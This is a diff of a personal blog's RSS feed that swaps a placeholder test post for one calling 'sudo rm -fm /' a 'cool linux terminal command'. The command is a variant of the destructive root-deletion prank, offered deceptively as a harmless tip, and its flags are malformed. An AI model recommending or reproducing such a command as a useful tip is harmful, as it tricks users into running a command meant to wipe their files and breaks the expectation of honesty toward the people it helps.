@@ -14,9 +14,11 @@
             <pubDate>Tue, 22 Nov 2022 20:18:24 +0200</pubDate>
             
             <guid>https://TheNaciaaStrike.github.io/posts/test/</guid>
-            <description>This is a test page plz ignore</description>
-            <content type="html"><![CDATA[<p>This is a test page plz ignore</p>
-]]></content>
+            <description>here is some cool linux terminal command
+sudo rm -fm / </description>
+            <content type="html"><![CDATA[<p>here is some cool linux terminal command</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo rm -fm /
+</code></pre></div>]]></content>
         </item>
         
     </channel>
